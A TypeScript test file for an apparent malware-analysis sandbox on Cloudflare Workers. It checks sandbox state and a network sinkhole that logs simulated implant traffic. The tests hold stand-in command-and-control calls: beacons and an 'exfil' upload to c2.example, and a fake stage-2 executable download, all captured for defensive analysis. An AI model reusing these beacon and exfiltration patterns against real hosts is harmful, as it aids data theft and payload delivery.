import { env, exports } from 'cloudflare:workers';
import { describe, expect, it } from 'vitest';
import type { SandboxConfig } from '../src/sandbox';

// These tests cover the Durable Objects' own state. The test runtime has no container binding,
// so nothing here starts a container.

const stubFor = (name: string) => env.SANDBOX.getByName(`test/${name}`);

const config = (name: string, overrides: Partial<SandboxConfig> = {}) => ({
  principal: 'test',
  name,
  network: 'offline' as const,
  instance: 'standard-1' as const,
  autoBackup: false,
  ...overrides,
});

// Durable Object RPC promises are pipelined thenables; await them once and keep the message.
async function errorOf(call: () => Promise<unknown>): Promise<string> {
  try {
    await call();
  } catch (error) {
    return String(error);
  }
  return 'no error';
}

const sha256 = async (data: BufferSource) => new Uint8Array(await crypto.subtle.digest('SHA-256', data)).toHex();

describe('Sandbox state', () => {
  it('registers, lists and deletes sandboxes per principal', async () => {
    const stub = stubFor('reg');
    await stub.create(config('reg'));
    expect(await errorOf(() => stub.create(config('reg')))).toContain('already exists');
    expect((await env.REGISTRY.getByName('test').list()).map((s) => s.name)).toContain('reg');
    expect(await env.REGISTRY.getByName('someone-else').list()).toEqual([]);

    await stub.delete();
    expect((await env.REGISTRY.getByName('test').list()).map((s) => s.name)).not.toContain('reg');
    expect(await errorOf(() => stub.status())).toContain('sandbox_create');
  });

  it('reuses a name right after deleting it', async () => {
    const stub = stubFor('again');
    await stub.create(config('again'));
    await stub.delete();
    await stub.create(config('again'));
    expect(await stub.status()).toMatchObject({
      name: 'again',
      snapshots: [],
      jobs: [],
      networkEvents: 0,
      sinkholeRules: [],
      // Unknown until the container first starts; the test runtime has no container binding.
      image: null,
      deployedImage: null,
      imageCurrent: null,
    });
  });

  it('updates only the settings that were given', async () => {
    const stub = stubFor('upd');
    await stub.create(config('upd', { autoBackup: true }));
    await stub.update({ network: 'sinkhole', instance: undefined, autoBackup: undefined });
    expect(await stub.status()).toMatchObject({ network: 'sinkhole', instance: 'standard-1', autoBackup: true });
  });
});

describe('network sinkhole', () => {
  it('logs requests on the sandbox that made them', async () => {
    const stub = stubFor('sink');
    await stub.create(config('sink', { network: 'sinkhole' }));
    const sinkhole = exports.NetworkSinkhole({ props: { sandboxId: env.SANDBOX.idFromName('test/sink').toString() } });

    const response = await sinkhole.fetch('https://c2.example/gate.php', {
      method: 'POST',
      headers: { 'User-Agent': 'implant/1.0' },
      body: 'id=42',
    });
    expect(response.status).toBe(200);

    await expect.poll(() => stub.networkLog(0, 10)).toHaveLength(1);
    const [event] = await stub.networkLog(0, 10);
    expect(event).toMatchObject({
      method: 'POST',
      url: 'https://c2.example/gate.php',
      bodySize: 5,
      bodyPreview: 'id=42',
    });
    expect(event!.headers['user-agent']).toBe('implant/1.0');
    expect(event!.response).toEqual({ status: 200, rule: null });
  });

  it('keeps binary bodies intact and saves large ones as artifacts', async () => {
    const stub = stubFor('sink-binary');
    await stub.create(config('sink-binary', { network: 'sinkhole' }));
    const sinkhole = exports.NetworkSinkhole({
      props: {
        sandboxId: env.SANDBOX.idFromName('test/sink-binary').toString(),
        owner: { principal: 'test', name: 'sink-binary' },
      },
    });

    const beacon = new Uint8Array([0xde, 0xad, 0x00, 0xbe, 0xef]);
    await sinkhole.fetch('https://c2.example/beacon', { method: 'POST', body: beacon });
    await sinkhole.fetch('https://c2.example/upload', { method: 'POST', body: 'A'.repeat(100_000) });
    // Larger than two R2 multipart parts, sent in uneven chunks.
    const archive = new Uint8Array(17 * 1024 * 1024);
    const block = crypto.getRandomValues(new Uint8Array(65_536));
    for (let offset = 0; offset < archive.length; offset += block.length) archive.set(block, offset);
    archive[archive.length - 1] = 0x42;
    const chunks = new ReadableStream<Uint8Array>({
      start(controller) {
        for (let offset = 0; offset < archive.length; offset += 1_000_003) {
          controller.enqueue(archive.subarray(offset, offset + 1_000_003));
        }
        controller.close();
      },
    });
    await sinkhole.fetch('https://c2.example/exfil', { method: 'POST', body: chunks });

    await expect.poll(() => stub.networkLog(0, 10)).toHaveLength(3);
    const [binary, large, exfil] = await stub.networkLog(0, 10);
    expect(binary).toMatchObject({ bodySize: 5, bodyEncoding: 'base64', bodyArtifact: null });
    expect(Uint8Array.fromBase64(binary!.bodyPreview)).toEqual(beacon);
    expect(large).toMatchObject({ bodySize: 100_000, bodyPreview: 'A'.repeat(4096), bodyEncoding: 'utf8' });
    expect(large!.bodyArtifact).toMatch(/^sinkhole\/sink-binary\/.+\.bin$/);
    expect(await (await env.BUCKET.get(`artifacts/test/${large!.bodyArtifact}`))!.text()).toBe('A'.repeat(100_000));
    expect(exfil!.bodySize).toBe(archive.length);
    const saved = await env.BUCKET.get(`artifacts/test/${exfil!.bodyArtifact}`);
    expect(saved!.customMetadata).toEqual({ sandbox: 'sink-binary', sinkhole: 'POST https://c2.example/exfil' });
    expect(saved!.size).toBe(archive.length);
    expect(await sha256(await saved!.arrayBuffer())).toBe(await sha256(archive));
  });

  it('keeps only the preview without an owner', async () => {
    const stub = stubFor('sink-anon');
    await stub.create(config('sink-anon', { network: 'sinkhole' }));
    const sinkhole = exports.NetworkSinkhole({
      props: { sandboxId: env.SANDBOX.idFromName('test/sink-anon').toString() },
    });
    await sinkhole.fetch('https://c2.example/upload', { method: 'POST', body: 'A'.repeat(10_000) });
    await expect.poll(() => stub.networkLog(0, 10)).toHaveLength(1);
    expect((await stub.networkLog(0, 10))[0]).toMatchObject({ bodySize: 10_000, bodyArtifact: null });
  });

  it('answers with the first matching rule', async () => {
    const stub = stubFor('rules');
    await stub.create(config('rules', { network: 'sinkhole' }));
    await env.BUCKET.put('artifacts/test/stage2.bin', new Uint8Array([0x4d, 0x5a]));
    await stub.setSinkholeRules([
      { host: '*.c2.example', path: '/gate.php', method: 'post', status: 200, headers: {}, body: 'OK:sleep=60' },
      {
        host: 'cdn.example',
        path: '/s2/*',
        status: 200,
        headers: { 'Content-Type': 'application/x-msdownload' },
        artifact: 'stage2.bin',
      },
      { status: 503, headers: { 'Retry-After': '1' }, body: 'AAEC', bodyEncoding: 'base64' },
    ]);
    const sinkhole = exports.NetworkSinkhole({ props: { sandboxId: env.SANDBOX.idFromName('test/rules').toString() } });

    const gate = await sinkhole.fetch('https://a.c2.example/gate.php?id=1', { method: 'POST', body: 'x' });
    expect([gate.status, await gate.text()]).toEqual([200, 'OK:sleep=60']);

    const stage2 = await sinkhole.fetch('http://cdn.example/s2/payload.exe');
    expect(stage2.headers.get('Content-Type')).toBe('application/x-msdownload');
    expect(new Uint8Array(await stage2.arrayBuffer())).toEqual(new Uint8Array([0x4d, 0x5a]));

    // GET does not match the POST-only first rule, so the catch-all answers.
    const other = await sinkhole.fetch('https://a.c2.example/gate.php');
    expect([other.status, other.headers.get('Retry-After')]).toEqual([503, '1']);
    expect(new Uint8Array(await other.arrayBuffer())).toEqual(new Uint8Array([0, 1, 2]));

    expect((await stub.networkLog(0, 10)).map((e) => e.response)).toEqual([
      { status: 200, rule: 0 },
      { status: 200, rule: 1 },
      { status: 503, rule: 2 },
    ]);
    expect((await stub.status()).sinkholeRules).toHaveLength(3);
  });

  it('rejects rules that cannot produce a response', async () => {
    const stub = stubFor('bad-rules');
    await stub.create(config('bad-rules', { network: 'sinkhole' }));
    expect(await errorOf(() => stub.setSinkholeRules([{ status: 204, headers: {}, body: 'x' }]))).toContain(
      'Sinkhole rule 0',
    );
    expect(
      await errorOf(() => stub.setSinkholeRules([{ status: 200, headers: {}, body: 'x', artifact: 'y' }])),
    ).toContain('not both');
    expect(await errorOf(() => stub.setSinkholeRules([{ path: '/a(b', status: 200, headers: {} }]))).toContain(
      'URLPattern',
    );
  });
});
